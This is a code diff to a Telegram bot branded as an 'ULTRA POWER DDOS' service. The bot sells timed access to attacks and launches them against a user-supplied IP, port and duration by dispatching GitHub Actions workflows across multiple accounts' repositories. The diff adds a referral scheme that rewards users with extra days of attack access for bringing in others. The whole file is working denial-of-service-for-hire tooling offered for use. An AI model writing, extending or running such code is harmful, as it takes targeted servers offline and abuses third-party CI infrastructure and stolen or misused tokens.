@@ -1,6 +1,8 @@
 import time
 import asyncio
 import aiohttp
+import random
+import string
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from telegram import Update
 
@@ -14,14 +16,15 @@ GITHUB_ACCOUNTS = [
 ]
 
 approved_users = {}
+used_referrals = set() # Tracks users who have already claimed a referral
 is_attack_running = False
 attack_end_time = 0 
 current_target = ""
 
-PACKET_SIZE = 64
-THREADS = 150
-
 # --- HELPER FUNCTIONS ---
+
+def generate_referral_code(user_id):
+    return f"MRX-{str(user_id)[-4:]}-{random.choice(string.ascii_uppercase)}{random.randint(10,99)}"
 
 def is_approved(user_id: int):
     if user_id in approved_users:
@@ -29,30 +32,32 @@ def is_approved(user_id: int):
     return False
 
 def approve_user(user_id: int, days: int):
-    if days > 365:
-        days = 365
-    expiry_time = time.time() + (days * 86400)
-    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}
+    if days > 365: days = 365
+    current_expiry = approved_users.get(user_id, {}).get('expiry_time', time.time())
+    # If user is already approved, add time to current expiry; else start from now.
+    start_time = max(current_expiry, time.time())
+    expiry_time = start_time + (days * 86400)
+    
+    if user_id not in approved_users:
+        ref_code = generate_referral_code(user_id)
+    else:
+        ref_code = approved_users[user_id]['ref_code']
+        
+    approved_users[user_id] = {
+        'expiry_time': expiry_time, 
+        'approved_days': days,
+        'ref_code': ref_code
+    }
 
 # Auto-approve admin
 approve_user(ADMIN_ID, 36500)
 
 async def trigger_all_workflows_async(ip, port, duration):
-    params = {
-        "ref": "main",
-        "inputs": {
-            "ip": str(ip), "port": str(port), "duration": str(duration),
-            "packet_size": str(PACKET_SIZE), "threads": str(THREADS)
-        }
-    }
+    params = {"ref": "main", "inputs": {"ip": str(ip), "port": str(port), "duration": str(duration), "packet_size": "64", "threads": "150"}}
     async with aiohttp.ClientSession() as session:
         tasks = []
         for account in GITHUB_ACCOUNTS:
-            headers = {
-                "Authorization": f"Bearer {account['token']}",
-                "Accept": "application/vnd.github.v3+json",
-                "Content-Type": "application/json"
-            }
+            headers = {"Authorization": f"Bearer {account['token']}", "Accept": "application/vnd.github.v3+json"}
             for repo in account['repos']:
                 url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
                 tasks.append(session.post(url, headers=headers, json=params, timeout=10))
@@ -61,37 +66,53 @@ async def trigger_all_workflows_async(ip, port, duration):
 # --- COMMANDS ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome = "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Status\n/approve <id> <days>\n/remove <id>"
+    welcome = "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Status & Referral Code\n/reffer <code> - Claim 1 Day\n/approve <id> <days>"
     await update.message.reply_text(welcome)
 
-async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Admin only.")
+async def reffer(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in used_referrals:
+        await update.message.reply_text("❌ You have already used a referral code.")
         return
-    try:
-        user_id, days = int(context.args[0]), int(context.args[1])
-        if 1 <= days <= 365:
-            approve_user(user_id, days)
-            expiry_str = time.strftime("%Y-%m-%d", time.localtime(approved_users[user_id]['expiry_time']))
-            await update.message.reply_text(f"✅ USER APPROVED!\n🆔 {user_id}\n📅 {days} Days\n⏰ Expiry: {expiry_str}")
-        else:
-            await update.message.reply_text("❌ Days must be 1-365.")
-    except:
-        await update.message.reply_text("Usage: /approve <user_id> <days>")
 
-async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Admin only.")
+    if len(context.args) != 1:
+        await update.message.reply_text("Usage: /reffer <referral_code>")
         return
-    try:
-        user_id = int(context.args[0])
-        if user_id in approved_users:
-            del approved_users[user_id]
-            await update.message.reply_text(f"🗑️ USER REMOVED!\n🆔 {user_id}")
-        else:
-            await update.message.reply_text("❌ User not found in approved list.")
-    except:
-        await update.message.reply_text("Usage: /remove <user_id>")
+
+    input_code = context.args[0]
+    referrer_id = None
+
+    # Find who the code belongs to
+    for uid, data in approved_users.items():
+        if data['ref_code'] == input_code:
+            referrer_id = uid
+            break
+
+    if not referrer_id:
+        await update.message.reply_text("❌ Invalid Referral Code.")
+        return
+
+    if referrer_id == user_id:
+        await update.message.reply_text("❌ You cannot use your own code.")
+        return
+
+    # Grant rewards
+    used_referrals.add(user_id)
+    approve_user(user_id, 1) # New user gets 1 day
+    approve_user(referrer_id, 2) # Referrer gets 2 days bonus
+    
+    await update.message.reply_text(f"✅ SUCCESS!\n🎁 You received 1 day access.\n🙌 Referrer @{referrer_id} received 2 days bonus.")
+
+async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if is_approved(user_id):
+        data = approved_users[user_id]
+        expiry = time.strftime("%Y-%m-%d", time.localtime(data['expiry_time']))
+        msg = f"✅ APPROVED\n🆔 {user_id}\n⏰ Expiry: {expiry}\n🎟️ Your Referral Code: `{data['ref_code']}`\n(Share code to get 2 days bonus!)"
+    else:
+        msg = f"❌ NOT APPROVED\n🆔 {user_id}\n💡 Use `/reffer <code>` to get 1 day free!"
+    await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_attack_running, attack_end_time, current_target
@@ -131,14 +152,22 @@ async def execute_attack(update, ip, port, duration):
         is_attack_running = False
         current_target = ""
 
-async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if is_approved(user_id):
-        expiry = time.strftime("%Y-%m-%d", time.localtime(approved_users[user_id]['expiry_time']))
-        msg = f"✅ APPROVED\n🆔 {user_id}\n⏰ Expiry: {expiry}"
-    else:
-        msg = f"❌ NOT APPROVED\n🆔 {user_id}"
-    await update.message.reply_text(msg)
+async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        user_id, days = int(context.args[0]), int(context.args[1])
+        approve_user(user_id, days)
+        await update.message.reply_text(f"✅ Approved {user_id} for {days} days.")
+    except: pass
+
+async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    try:
+        user_id = int(context.args[0])
+        if user_id in approved_users:
+            del approved_users[user_id]
+            await update.message.reply_text(f"🗑️ User {user_id} removed.")
+    except: pass
 
 def main():
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
@@ -147,7 +176,8 @@ def main():
     app.add_handler(CommandHandler("Myid", Myid))
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CommandHandler("remove", remove))
-    print("✅ Bot is online.")
+    app.add_handler(CommandHandler("reffer", reffer))
+    print("✅ Bot is online with Referral System.")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
